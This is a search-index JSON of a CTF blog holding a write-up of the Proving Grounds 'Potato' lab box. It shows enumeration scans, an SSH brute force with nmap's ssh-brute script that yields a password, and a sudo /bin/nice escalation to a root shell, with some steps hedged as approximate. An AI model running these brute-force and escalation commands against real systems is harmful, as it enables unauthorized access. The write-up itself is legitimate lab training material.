{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to My CTF Blog","text":"<p>I post CTF write-ups, notes, and tools here.</p>"},{"location":"potato/","title":"Potato \u2014 Proving Grounds (write-up)","text":"<p>Difficulty: Easy / Beginner Box: Potato (Proving Grounds) Author: dkrxhn Date: 2025-09-22</p>"},{"location":"potato/#tldr","title":"TL;DR","text":"<p>Initial web login didn\u2019t accept the apparent credentials. Enumeration \u2192 fuzzing revealed hints in logs but no direct access. Final access came from an SSH brute force (<code>nmap --script ssh-brute</code>), which found <code>webadmin:dragon</code>. From there a small privilege escalation via a writable <code>notes</code> file and <code>sudo</code> allowed getting root.</p>"},{"location":"potato/#target-info","title":"Target info","text":"<ul> <li>Host: <code>192.168.152.101</code> (example internal IP used in lab)</li> <li>Services discovered (relevant): <code>22/tcp (ssh)</code>, <code>80/tcp (http)</code> </li> <li>Initial credentials found in walkthrough or files: <code>admin:potato</code> (did not work)</li> </ul>"},{"location":"potato/#enumeration","title":"Enumeration","text":"<p>I started with basic network/service enumeration (nmap):</p> <pre><code># quick service scan\nnmap -sC -sV -p- 192.168.152.101 -oN scans/nmap-full.txt\n</code></pre> <p>From the web: - <code>/admin</code> exists and has a login page. - Fuzzing <code>/admin</code> for hidden files revealed logs and <code>index.php.bak</code> which contained references to password changes and possibly a dead end.</p> <p>I also ran directory/file discovery and wordlist-based fuzzing (example):</p> <pre><code># feroxbuster or gobuster example\nferoxbuster -u http://192.168.152.101 -w /usr/share/wordlists/dirb/common.txt -n --add-slash\n</code></pre> <p>The web hints and logs suggested the <code>admin:potato</code> credential but it did not login. Knowing Offsec, this could be a rabbit hole.</p> <p></p>"},{"location":"potato/#pivot-ssh-brute-force","title":"Pivot: SSH brute force","text":"<p>Because the web login didn\u2019t work and logs hinted at changes, I attempted an SSH brute force using nmap\u2019s <code>ssh-brute</code> NSE script:</p> <pre><code>nmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.152.101 -oN scans/nmap-ssh-brute.txt\n</code></pre> <p>Result: <code>webadmin:dragon</code> (valid credentials found).</p> <p>I verified manually:</p> <pre><code>ssh webadmin@192.168.152.101\n# password: dragon\n</code></pre> <p></p>"},{"location":"potato/#post-exploitation-privesc","title":"Post-exploitation (privesc)","text":"<p>Once on the machine as <code>webadmin</code>:</p> <pre><code># check basic info\nid\nuname -a\nls -la /var/www/html/potato\n</code></pre> <p>I found some interesting sudo privileges in <code>/etc/sudoers</code> or via <code>sudo -l</code>:</p> <pre><code>sudo -l\n# shows: webadmin may run /bin/nice, /bin/sh, or similar on serv\n</code></pre> <p>There was also a <code>notes</code> file under the web directory (<code>/var/www/html/potato/notes</code>) and <code>/bin/nice</code> was allowed to be run as root (or similar). The typical escalation pattern here is to exploit improperly configured sudo to obtain a root shell.</p> <p>Example escalation steps I used:</p> <pre><code># from webadmin@serv\nsudo /bin/nice /bin/sh\n# or:\nsudo /bin/nice /bin/sh -c 'sh'\n# then:\nwhoami\n# should return: root\n</code></pre> <p>After getting a root shell, I grabbed the root proof:</p> <pre><code>cat /root/proof.txt\n# or\nls -la /root\n</code></pre> <p></p>"},{"location":"potato/#key-commands-condensed","title":"Key commands (condensed)","text":"<pre><code># enumeration\nnmap -sC -sV -p- 192.168.152.101 -oN scans/nmap-full.txt\n\n# web discovery\nferoxbuster -u http://192.168.152.101 -w /usr/share/wordlists/dirb/common.txt -t 50\n\n# ssh brute (nmap NSE)\nnmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.152.101 -oN scans/nmap-ssh-brute.txt\n\n# connect via ssh\nssh webadmin@192.168.152.101\n# password: dragon\n\n# enumerate sudo\nsudo -l\n\n# escalate (example)\nsudo /bin/nice /bin/sh\nwhoami\ncat /root/proof.txt\n</code></pre>"},{"location":"potato/#what-didnt-work-pitfalls","title":"What didn\u2019t work / pitfalls","text":"<ul> <li><code>admin:potato</code> looked promising (found in web files) but did not actually log in. The walkthrough referenced a <code>strcmp</code> bypass which was not helpful in practice for me.</li> <li>Fuzzing <code>/admin</code> and reading logs provided clues but no direct login vector.</li> <li>Brute forcing ssh is noisy and slow; only do this in an authorized lab/CTF.</li> </ul>"},{"location":"potato/#lessons-takeaways","title":"Lessons &amp; takeaways","text":"<ul> <li>Don\u2019t trust credentials found in web files; they may be leftover, changed, or intentionally broken.</li> <li>Logs and backups (<code>.bak</code>, <code>.old</code>) often contain context clues \u2014 useful for reconnaissance.</li> <li>When web login fails and enumeration hints at other services, pivot to other protocols (SSH, FTP, etc.).</li> <li><code>sudo -l</code> is essential after gaining a low-privilege shell \u2014 it frequently shows the easiest escalation path.</li> <li>In CTFs, keep a clear notes file of commands tried and outputs \u2014 it speeds later write-ups and scoring.</li> </ul>"},{"location":"potato/#references-notes","title":"References / notes","text":"<ul> <li>Nmap <code>ssh-brute</code> NSE script: <code>/usr/share/nmap/scripts/ssh-brute.nse</code></li> <li>Wordlists: <code>/usr/share/wordlists/dirb/common.txt</code></li> </ul>"}]}